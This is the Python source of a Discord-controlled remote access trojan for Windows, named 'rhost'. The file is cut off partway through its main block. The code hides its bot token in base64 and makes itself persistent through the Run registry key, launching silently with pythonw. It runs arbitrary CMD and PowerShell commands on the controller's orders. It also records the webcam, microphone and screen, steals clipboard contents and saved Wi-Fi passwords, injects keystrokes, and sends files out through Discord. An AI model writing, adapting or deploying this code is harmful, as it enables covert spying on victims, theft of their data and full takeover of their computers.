import discord
from discord.ext import commands
import subprocess
import os
import psutil
from datetime import datetime
import ctypes
import sys
import winreg
import asyncio
import platform
import socket
import requests
import base64

# Configuration
BOT_TOKEN = base64.b64decode("TVRRNU1qTTRNekF5TkRJek56WTBOVGt5TlEuRzhBeWRuLnhia1JvbXR3OWtKNlpDbE9EcHhkV2dhZ2VEZmJrNjlfclNRZl9F").decode()
AUTHORIZED_USER_ID = 1492261856604324103  # Your Discord user ID? No, OURS. ⚒️
STARTUP_NAME = "rhost"  # Namey

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

def is_admin():
    """Check if running with admin privileges"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    """Add script to Windows startup"""
    try:
        python_path = sys.executable.replace('python.exe', 'pythonw.exe')
        if not os.path.exists(python_path):
            python_path = sys.executable
        
        script_path = os.path.abspath(sys.argv[0])
        startup_command = f'"{python_path}" "{script_path}"'
        
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, startup_command)
        winreg.CloseKey(key)
        
        print(f"✅ Added '{STARTUP_NAME}' to startup")
        return True
    except Exception as e:
        print(f"❌ Failed to add to startup: {e}")
        return False

def is_in_startup():
    """Check if already in startup"""
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
        try:
            winreg.QueryValueEx(key, STARTUP_NAME)
            winreg.CloseKey(key)
            return True
        except FileNotFoundError:
            winreg.CloseKey(key)
            return False
    except:
        return False

def remove_from_startup():
    """Remove from startup"""
    try:
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, STARTUP_NAME)
        winreg.CloseKey(key)
        print(f"✅ Removed '{STARTUP_NAME}' from startup")
        return True
    except FileNotFoundError:
        print(f"❌ '{STARTUP_NAME}' not found in startup")
        return False
    except Exception as e:
        print(f"❌ Failed to remove from startup: {e}")
        return False

def is_authorized():
    async def predicate(ctx):
        if ctx.author.id != AUTHORIZED_USER_ID:
            await ctx.send("❌ Unauthorized")
            return False
        return True
    return commands.check(predicate)

@bot.event
async def on_ready():
    admin_status = "✅ ADMIN" if is_admin() else "⚠️ USER"
    startup_status = "✅ ENABLED" if is_in_startup() else "❌ DISABLED"
    
    print(f'✅ rhost Online: {bot.user.name}')
    print(f'Permissions: {admin_status}')
    print(f'Startup: {startup_status}')
    print(f'Ready to receive commands')
    
    await bot.change_presence(activity=discord.Game(name=f"{admin_status} Mode"))

# ==================== SYSTEM COMMANDS ====================

@bot.command()
@is_authorized()
async def cmd(ctx, *, command):
    """Execute a Windows command (CMD)"""
    try:
        result = subprocess.run(
            f'cmd /c {command}',
            capture_output=True,
            text=True,
            timeout=60
        )
        
        output = result.stdout + result.stderr
        
        if not output.strip():
            output = "✅ Command executed (no output)"
        
        if len(output) <= 1900:
            await ctx.send(f"```\n{output}\n```")
        else:
            lines = output.split('\n')
            current_chunk = ""
            
            for line in lines:
                if len(current_chunk) + len(line) + 1 < 1900:
                    current_chunk += line + '\n'
                else:
                    if current_chunk:
                        await ctx.send(f"```\n{current_chunk}\n```")
                    current_chunk = line + '\n'
            
            if current_chunk:
                await ctx.send(f"```\n{current_chunk}\n```")
    
    except subprocess.TimeoutExpired:
        await ctx.send("⏱️ Command timed out")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def shell(ctx, *, command):
    """Execute a PowerShell command"""
    try:
        result = subprocess.run(
            ['powershell', '-Command', command],
            capture_output=True,
            text=True,
            timeout=60
        )
        
        output = result.stdout + result.stderr
        
        if not output.strip():
            output = "✅ Command executed (no output)"
        
        if len(output) <= 1900:
            await ctx.send(f"```\n{output}\n```")
        else:
            lines = output.split('\n')
            current_chunk = ""
            
            for line in lines:
                if len(current_chunk) + len(line) + 1 < 1900:
                    current_chunk += line + '\n'
                else:
                    if current_chunk:
                        await ctx.send(f"```\n{current_chunk}\n```")
                    current_chunk = line + '\n'
            
            if current_chunk:
                await ctx.send(f"```\n{current_chunk}\n```")
    
    except subprocess.TimeoutExpired:
        await ctx.send("⏱️ Command timed out")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def run(ctx, *, filepath):
    """Run a file"""
    try:
        filepath = os.path.expandvars(filepath)
        
        if not os.path.exists(filepath):
            await ctx.send(f"❌ File not found: `{filepath}`")
            return
        
        subprocess.Popen(filepath, shell=True)
        await ctx.send(f"✅ Started: `{filepath}`")
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def users(ctx):
    """Show users on the PC"""
    try:
        result = subprocess.run(
            'net user',
            capture_output=True,
            text=True,
            shell=True
        )
        await ctx.send(f"```\n{result.stdout}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def whoami(ctx):
    """Show the name of the PC"""
    try:
        pc_name = socket.gethostname()
        username = os.getlogin()
        await ctx.send(f"💻 **PC Name:** `{pc_name}`\n👤 **User:** `{username}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def tasklist(ctx):
    """Show running tasks (alias for view)"""
    await view(ctx)

@bot.command()
@is_authorized()
async def taskkill(ctx, *, task):
    """Kill a task by name"""
    try:
        subprocess.run(f'taskkill /F /IM {task}', shell=True, check=True)
        await ctx.send(f"✅ Killed task: `{task}`")
    except subprocess.CalledProcessError:
        await ctx.send(f"❌ Failed to kill task: `{task}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def sleep(ctx):
    """Put the PC to sleep"""
    await ctx.send("💤 Putting PC to sleep...")
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

@bot.command()
@is_authorized()
async def shutdown(ctx, timer: int = 0):
    """Shutdown the PC"""
    await ctx.send(f"🔌 Shutting down in {timer} seconds...")
    os.system(f"shutdown /s /t {timer}")

@bot.command()
@is_authorized()
async def restart(ctx, timer: int = 0):
    """Restart the PC"""
    await ctx.send(f"🔄 Restarting in {timer} seconds...")
    os.system(f"shutdown /r /t {timer}")

@bot.command()
@is_authorized()
async def altf4(ctx):
    """Press ALT+F4"""
    try:
        import pyautogui
        pyautogui.hotkey('alt', 'f4')
        await ctx.send("✅ Pressed ALT+F4")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def msg(ctx, msg_type: str, title: str, *, text: str):
    """Display a message box (types: info, warning, error, question)"""
    try:
        import win32api
        import win32con
        
        types = {
            'info': win32con.MB_ICONINFORMATION,
            'warning': win32con.MB_ICONWARNING,
            'error': win32con.MB_ICONERROR,
            'question': win32con.MB_ICONQUESTION,
            'default': 0,
            '0': 0
        }
        
        msg_style = types.get(msg_type.lower(), 0)
        win32api.MessageBox(0, text, title, msg_style)
        
        await ctx.send(f"✅ Message displayed: **{title}**")
        
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pywin32`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ==================== DEVICE MANAGEMENT ====================

@bot.command()
@is_authorized()
async def screenshot(ctx):
    """Take a screenshot"""
    filename = None
    try:
        import mss
        
        with mss.mss() as sct:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"screenshot_{timestamp}.png"
            sct.shot(output=filename)
            await ctx.send(file=discord.File(filename))
            
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install mss`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
    finally:
        if filename and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass

@bot.command()
@is_authorized()
async def webcam(ctx):
    """Take a photo from webcam"""
    filename = None
    try:
        import cv2
        
        camera = cv2.VideoCapture(0)
        
        if not camera.isOpened():
            await ctx.send("❌ Could not access webcam")
            return
        
        ret, frame = camera.read()
        
        if ret:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"webcam_{timestamp}.jpg"
            cv2.imwrite(filename, frame)
            await ctx.send(file=discord.File(filename))
        else:
            await ctx.send("❌ Failed to capture image")
        
        camera.release()
        
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install opencv-python`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
    finally:
        if filename and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass

@bot.command()
@is_authorized()
async def camrecord(ctx, seconds: int = 5):
    """Record webcam video"""
    filename = None
    try:
        import cv2
        
        if seconds > 30:
            await ctx.send("⏱️ Max recording time is 30 seconds")
            return
        
        await ctx.send(f"🎥 Recording for {seconds} seconds...")
        
        camera = cv2.VideoCapture(0)
        
        if not camera.isOpened():
            await ctx.send("❌ Could not access webcam")
            return
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"camrecord_{timestamp}.avi"
        
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        
        start_time = datetime.now()
        
        while (datetime.now() - start_time).seconds < seconds:
            ret, frame = camera.read()
            if ret:
                out.write(frame)
        
        camera.release()
        out.release()
        
        # Check file size
        file_size = os.path.getsize(filename)
        if file_size > 25_000_000:
            await ctx.send(f"❌ Video too large: {file_size / (1024**2):.2f}MB (max 25MB)")
        else:
            await ctx.send(file=discord.File(filename))
        
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install opencv-python`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
    finally:
        if filename and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass

@bot.command()
@is_authorized()
async def mic(ctx, seconds: int = 5):
    """Record microphone audio"""
    filename = None
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
        
        if seconds > 30:
            await ctx.send("⏱️ Max recording time is 30 seconds")
            return
        
        await ctx.send(f"🎙️ Recording for {seconds} seconds...")
        
        fs = 44100
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"mic_{timestamp}.wav"
        write(filename, fs, recording)
        
        await ctx.send(file=discord.File(filename))
        
    except ImportError:
        await ctx.send("❌ Missing dependencies: `pip install sounddevice scipy`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
    finally:
        if filename and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass

@bot.command()
@is_authorized()
async def screenrecord(ctx, seconds: int = 10):
    """Record the screen"""
    filename = None
    try:
        import cv2
        import numpy as np
        from mss import mss
        
        if seconds > 30:
            await ctx.send("⏱️ Max recording time is 30 seconds")
            return
        
        await ctx.send(f"🎥 Recording screen for {seconds} seconds...")
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"screenrecord_{timestamp}.avi"
        
        with mss() as sct:
            monitor = sct.monitors[1]
            
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter(filename, fourcc, 20.0, (monitor['width'], monitor['height']))
            
            start_time = datetime.now()
            
            while (datetime.now() - start_time).seconds < seconds:
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                out.write(frame)
            
            out.release()
        
        file_size = os.path.getsize(filename)
        if file_size > 25_000_000:
            await ctx.send(f"❌ Video too large: {file_size / (1024**2):.2f}MB (max 25MB)")
        else:
            await ctx.send(file=discord.File(filename))
        
    except ImportError:
        await ctx.send("❌ Missing dependencies: `pip install opencv-python mss numpy`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
    finally:
        if filename and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass

@bot.command()
@is_authorized()
async def fullvolume(ctx):
    """Set volume to 100%"""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(1.0, None)
        
        await ctx.send("🔊 Volume set to 100%")
        
    except ImportError:
        await ctx.send("❌ Missing dependencies: `pip install pycaw comtypes`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def volumeplus(ctx):
    """Increase volume by 10%"""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        
        current = volume.GetMasterVolumeLevelScalar()
        new_volume = min(current + 0.1, 1.0)
        volume.SetMasterVolumeLevelScalar(new_volume, None)
        
        await ctx.send(f"🔉 Volume: {int(new_volume * 100)}%")
        
    except ImportError:
        await ctx.send("❌ Missing dependencies: `pip install pycaw comtypes`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def volumeminus(ctx):
    """Decrease volume by 10%"""
    try:
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        
        current = volume.GetMasterVolumeLevelScalar()
        new_volume = max(current - 0.1, 0.0)
        volume.SetMasterVolumeLevelScalar(new_volume, None)
        
        await ctx.send(f"🔇 Volume: {int(new_volume * 100)}%")
        
    except ImportError:
        await ctx.send("❌ Missing dependencies: `pip install pycaw comtypes`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def maximize(ctx):
    """Maximize the active window"""
    try:
        import pyautogui
        pyautogui.hotkey('win', 'up')
        await ctx.send("🪟 Maximized active window")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def minimize(ctx):
    """Minimize the active window"""
    try:
        import pyautogui
        pyautogui.hotkey('win', 'down')
        await ctx.send("🪟 Minimized active window")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def mousemove(ctx, x: int, y: int):
    """Move mouse to coordinates"""
    try:
        import pyautogui
        pyautogui.moveTo(x, y)
        await ctx.send(f"🖱️ Moved mouse to ({x}, {y})")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def mouseclick(ctx):
    """Left click mouse"""
    try:
        import pyautogui
        pyautogui.click()
        await ctx.send("🖱️ Left clicked")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def mouseright(ctx):
    """Right click mouse"""
    try:
        import pyautogui
        pyautogui.rightClick()
        await ctx.send("🖱️ Right clicked")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ==================== NETWORKING ====================

@bot.command()
@is_authorized()
async def wifilist(ctx):
    """Show saved Wi-Fi networks"""
    try:
        result = subprocess.run(
            'netsh wlan show profiles',
            capture_output=True,
            text=True,
            shell=True
        )
        await ctx.send(f"```\n{result.stdout}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def wifipass(ctx, *, ssid):
    """Show password for a saved Wi-Fi network"""
    try:
        result = subprocess.run(
            f'netsh wlan show profile name="{ssid}" key=clear',
            capture_output=True,
            text=True,
            shell=True
        )
        await ctx.send(f"```\n{result.stdout}\n```")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def chrome(ctx, *, url):
    """Open a website in Chrome"""
    try:
        subprocess.Popen(['start', 'chrome', url], shell=True)
        await ctx.send(f"🌐 Opened in Chrome: `{url}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def edge(ctx, *, url):
    """Open a website in Edge"""
    try:
        subprocess.Popen(['start', 'msedge', url], shell=True)
        await ctx.send(f"🌐 Opened in Edge: `{url}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def firefox(ctx, *, url):
    """Open a website in Firefox"""
    try:
        subprocess.Popen(['start', 'firefox', url], shell=True)
        await ctx.send(f"🌐 Opened in Firefox: `{url}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ==================== MULTIMEDIA ====================

@bot.command()
@is_authorized()
async def textspeak(ctx, *, text):
    """Speak text aloud"""
    try:
        import pyttsx3
        
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        
        await ctx.send(f"🔊 Speaking: `{text}`")
        
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyttsx3`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def playsound(ctx, *, filepath):
    """Play a sound file"""
    try:
        from playsound import playsound
        
        filepath = os.path.expandvars(filepath)
        
        if not os.path.exists(filepath):
            await ctx.send(f"❌ File not found: `{filepath}`")
            return
        
        playsound(filepath, False)
        await ctx.send(f"🎵 Playing: `{filepath}`")
        
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install playsound`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def upload(ctx):
    """Upload a file to the PC"""
    if not ctx.message.attachments:
        await ctx.send("❌ No file attached")
        return
    
    try:
        attachment = ctx.message.attachments[0]
        filename = attachment.filename
        await attachment.save(filename)
        full_path = os.path.abspath(filename)
        await ctx.send(f"✅ Uploaded: `{full_path}`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def transfer(ctx, *, filepath):
    """Download a file from the PC"""
    try:
        filepath = os.path.expandvars(filepath)
        
        if not os.path.exists(filepath):
            await ctx.send(f"❌ File not found: `{filepath}`")
            return
        
        if not os.path.isfile(filepath):
            await ctx.send(f"❌ Not a file: `{filepath}`")
            return
        
        file_size = os.path.getsize(filepath)
        
        if file_size > 25_000_000:
            await ctx.send(f"❌ File too large: {file_size / (1024**2):.2f}MB (max 25MB)")
            return
        
        await ctx.send(file=discord.File(filepath))
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def clip(ctx):
    """Get clipboard contents"""
    filename = None
    try:
        import pyperclip
        
        clipboard_content = pyperclip.paste()
        
        if not clipboard_content:
            await ctx.send("📋 Clipboard is empty")
            return
        
        if os.path.isfile(clipboard_content):
            await ctx.send(f"📋 Clipboard contains file path:\n`{clipboard_content}`")
            return
        
        if len(clipboard_content) <= 1900:
            await ctx.send(f"📋 **Clipboard:**\n```\n{clipboard_content}\n```")
        else:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'clipboard_{timestamp}.txt'
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(clipboard_content)
            
            await ctx.send("📋 **Clipboard:**", file=discord.File(filename))
            
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyperclip`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
    finally:
        if filename and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass

@bot.command()
@is_authorized()
async def changeclipboard(ctx, *, text):
    """Change clipboard content"""
    try:
        import pyperclip
        pyperclip.copy(text)
        await ctx.send(f"📋 Clipboard set to: `{text}`")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyperclip`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ==================== ADVANCED OPERATIONS ====================

@bot.command()
@is_authorized()
async def metadata(ctx, *, filepath):
    """Display file metadata"""
    try:
        filepath = os.path.expandvars(filepath)
        
        if not os.path.exists(filepath):
            await ctx.send(f"❌ File not found: `{filepath}`")
            return
        
        stat = os.stat(filepath)
        
        info = f"""
📄 **File:** {os.path.basename(filepath)}
📁 **Path:** {filepath}
📊 **Size:** {stat.st_size / 1024:.2f} KB
📅 **Created:** {datetime.fromtimestamp(stat.st_ctime)}
✏️ **Modified:** {datetime.fromtimestamp(stat.st_mtime)}
👁️ **Accessed:** {datetime.fromtimestamp(stat.st_atime)}
        """
        
        await ctx.send(info)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def keytype(ctx, *, text):
    """Type text with keyboard"""
    try:
        import pyautogui
        pyautogui.write(text, interval=0.05)
        await ctx.send(f"⌨️ Typed: `{text}`")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def keypress(ctx, key: str):
    """Press a key"""
    try:
        import pyautogui
        pyautogui.press(key)
        await ctx.send(f"⌨️ Pressed: `{key}`")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def keypresstwo(ctx, key1: str, key2: str):
    """Press two keys simultaneously"""
    try:
        import pyautogui
        pyautogui.hotkey(key1, key2)
        await ctx.send(f"⌨️ Pressed: `{key1}+{key2}`")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def keypressthree(ctx, key1: str, key2: str, key3: str):
    """Press three keys simultaneously"""
    try:
        import pyautogui
        pyautogui.hotkey(key1, key2, key3)
        await ctx.send(f"⌨️ Pressed: `{key1}+{key2}+{key3}`")
    except ImportError:
        await ctx.send("❌ Missing dependency: `pip install pyautogui`")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ==================== SYSTEM INFORMATION ====================

@bot.command()
@is_authorized()
async def info(ctx):
    """Show PC information (IP, location)"""
    try:
        # Get local IP
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        # Get public IP and location
        try:
            response = requests.get('http://ip-api.com/json/', timeout=5)
            data = response.json()
            
            public_ip = data.get('query', 'N/A')
            country = data.get('country', 'N/A')
            city = data.get('city', 'N/A')
            isp = data.get('isp', 'N/A')
            
            info_text = f"""
🌐 **Network Information**
📍 **Public IP:** {public_ip}
🏠 **Local IP:** {local_ip}
🗺️ **Location:** {city}, {country}
🔌 **ISP:** {isp}
💻 **Hostname:** {hostname}
            """
        except:
            info_text = f"""
🌐 **Network Information**
🏠 **Local IP:** {local_ip}
💻 **Hostname:** {hostname}
❌ **Could not fetch public IP info**
            """
        
        await ctx.send(info_text)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def pcinfo(ctx):
    """Detailed PC information"""
    try:
        import platform
        
        info = f"""
💻 **System Information**
🖥️ **OS:** {platform.system()} {platform.release()}
📦 **Version:** {platform.version()}
🏗️ **Architecture:** {platform.machine()}
⚙️ **Processor:** {platform.processor()}
🐍 **Python:** {platform.python_version()}
💾 **RAM:** {psutil.virtual_memory().total / (1024**3):.2f} GB
💿 **Disk:** {psutil.disk_usage('/').total / (1024**3):.2f} GB
        """
        
        await ctx.send(info)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def shortinfo(ctx):
    """Short system information"""
    try:
        cpu = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        info = f"""
💻 **Quick Info**
🖥️ **OS:** {platform.system()} {platform.release()}
🔥 **CPU:** {cpu}%
💾 **RAM:** {mem.percent}% ({mem.used // (1024**3)}GB / {mem.total // (1024**3)}GB)
💿 **Disk:** {disk.percent}% ({disk.used // (1024**3)}GB / {disk.total // (1024**3)}GB)
        """
        
        await ctx.send(info)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def apps(ctx):
    """Show installed apps"""
    filename = None
    try:
        result = subprocess.run(
            'wmic product get name,version',
            capture_output=True,
            text=True,
            shell=True,
            timeout=30
        )
        
        output = result.stdout
        
        if len(output) > 1900:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'apps_{timestamp}.txt'
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(output)
            
            await ctx.send("📦 **Installed Apps:**", file=discord.File(filename))
        else:
            await ctx.send(f"```\n{output}\n```")
        
    except subprocess.TimeoutExpired:
        await ctx.send("⏱️ Command timed out (takes a while to list all apps)")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
    finally:
        if filename and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass

@bot.command()
@is_authorized()
async def batteryinfo(ctx):
    """Show battery information"""
    try:
        battery = psutil.sensors_battery()
        
        if battery is None:
            await ctx.send("🔌 No battery detected (desktop PC)")
            return
        
        percent = battery.percent
        plugged = "🔌 Plugged in" if battery.power_plugged else "🔋 On battery"
        
        if battery.secsleft != -1:
            hours = battery.secsleft // 3600
            minutes = (battery.secsleft % 3600) // 60
            time_left = f"{hours}h {minutes}m"
        else:
            time_left = "Calculating..."
        
        info = f"""
🔋 **Battery Information**
📊 **Charge:** {percent}%
{plugged}
⏱️ **Time Remaining:** {time_left}
        """
        
        await ctx.send(info)
        
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

# ==================== PROCESS MANAGEMENT ====================

@bot.command()
@is_authorized()
async def view(ctx):
    """View all running processes"""
    filename = None
    try:
        processes = []
        
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try:
                pinfo = proc.info
                processes.append({
                    'pid': pinfo['pid'],
                    'name': pinfo['name'],
                    'cpu': pinfo['cpu_percent'] or 0,
                    'memory': pinfo['memory_info'].rss / (1024 * 1024)
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        processes.sort(key=lambda x: x['cpu'], reverse=True)
        
        output = "PID      | CPU%  | RAM(MB) | Name\n"
        output += "-" * 60 + "\n"
        
        for proc in processes[:50]:
            output += f"{proc['pid']:<8} | {proc['cpu']:<5.1f} | {proc['memory']:<7.1f} | {proc['name']}\n"
        
        if len(output) > 1900:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'processes_{timestamp}.txt'
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("PID      | CPU%  | RAM(MB) | Name\n")
                f.write("-" * 60 + "\n")
                for proc in processes:
                    f.write(f"{proc['pid']:<8} | {proc['cpu']:<5.1f} | {proc['memory']:<7.1f} | {proc['name']}\n")
            
            await ctx.send(f"📊 **Total Processes:** {len(processes)}", file=discord.File(filename))
        else:
            await ctx.send(f"```\n{output}\n```")
            
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")
    finally:
        if filename and os.path.exists(filename):
            try:
                os.remove(filename)
            except:
                pass

@bot.command()
@is_authorized()
async def kill(ctx, pid: int):
    """Kill a process by PID"""
    try:
        process = psutil.Process(pid)
        process_name = process.name()
        
        process.terminate()
        
        try:
            process.wait(timeout=3)
        except psutil.TimeoutExpired:
            process.kill()
        
        await ctx.send(f"✅ Killed process: `{process_name}` (PID: {pid})")
        
    except psutil.NoSuchProcess:
        await ctx.send(f"❌ No process found with PID: {pid}")
    except psutil.AccessDenied:
        await ctx.send(f"❌ Access denied")
    except Exception as e:
        await ctx.send(f"❌ Error: {str(e)}")

@bot.command()
@is_authorized()
async def killbot(ctx):
    """Shutdown the bot"""
    await ctx.send("👋 Shutting down...")
    await bot.close()

# ==================== STARTUP MANAGEMENT ====================

@bot.command()
@is_authorized()
async def startup(ctx, action: str = "status"):
    """Manage startup (status/enable/disable)"""
    action = action.lower()
    
    if action == "status":
        status = "✅ Enabled" if is_in_startup() else "❌ Disabled"
        await ctx.send(f"🔧 Startup: {status}")
    
    elif action == "enable":
        if is_in_startup():
            await ctx.send("✅ Already in startup")
        else:
            if add_to_startup():
                await ctx.send("✅ Added to startup")
            else:
                await ctx.send("❌ Failed to add to startup")
    
    elif action == "disable":
        if not is_in_startup():
            await ctx.send("❌ Not in startup")
        else:
            if remove_from_startup():
                await ctx.send("✅ Removed from startup")
            else:
                await ctx.send("❌ Failed to remove from startup")
    
    else:
        await ctx.send("❌ Invalid action. Use: status/enable/disable")

# ==================== ERROR HANDLER ====================

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing argument: {error.param.name}")
    elif isinstance(error, commands.CheckFailure):
        pass
    else:
        await ctx.send(f"❌ Error: {str(error)}")

# ==================== MAIN ====================

if __name__ == "__main__":
    if not is_admin():
